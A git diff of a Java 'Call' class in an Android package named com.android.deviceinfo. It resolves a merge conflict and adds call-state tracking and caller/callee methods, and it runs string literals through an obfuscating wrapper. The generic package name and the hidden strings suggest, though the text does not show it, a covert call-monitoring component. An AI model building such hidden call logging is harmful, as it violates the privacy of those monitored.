@@ -11,11 +11,9 @@ package com.android.deviceinfo;
 
 import java.util.Date;
 
-<<<<<<< HEAD
 import com.android.m.M;
-=======
+
 import com.android.deviceinfo.util.DateTime;
->>>>>>> ee94f15... new call list
 
 public class Call {
 	private static final String TAG = "Call"; //$NON-NLS-1$
@@ -27,6 +25,10 @@ public class Call {
 	private Date timeEnd;
 
 	private boolean offhook;
+
+	private String newState;
+	private String oldState;
+
 
 	public final static boolean INCOMING = true;
 	public final static boolean OUTGOING = false;
@@ -43,6 +45,22 @@ public class Call {
 
 	public String getNumber() {
 		return number;
+	}
+	
+	public String getFrom() {
+		if (incoming) {
+			return getNumber();			
+		} else {
+			return Device.self().getPhoneNumber();
+		}
+	}
+	
+	public String getTo() {
+		if (!incoming) {
+			return getNumber();			
+		} else {
+			return Device.self().getPhoneNumber();
+		}
 	}
 
 	public boolean isIncoming() {
@@ -95,11 +113,10 @@ public class Call {
 
 	@Override
 	public String toString() {
-<<<<<<< HEAD
-		return number
-				+ M.e(" ongoing: ") + ongoing + M.e(" incoming: ") + incoming + " " + timestamp; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-=======
-		return number + Messages.getString("28_1") + ongoing + Messages.getString("28_0") + incoming + " " + timeBegin; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+
+		return String.format(
+				M.e("%s ongoing: %s completed: %s incoming: %s begin: %s end: %s"), number, ongoing, complete, incoming, timeBegin, timeEnd);
+
 	}
 
 	public boolean isOffhook() {
@@ -107,7 +124,13 @@ public class Call {
 	}
 
 	public void setOffhook() {
-		offhook=true;
->>>>>>> ee94f15... new call list
+		offhook = true;
+	}
+
+	public boolean changedState() {
+		newState = String.format(M.e("%s %s %s %s"), number, ongoing, complete, incoming);
+		boolean changedState = !newState.equals(oldState);
+		oldState = newState;
+		return changedState;
 	}
 }
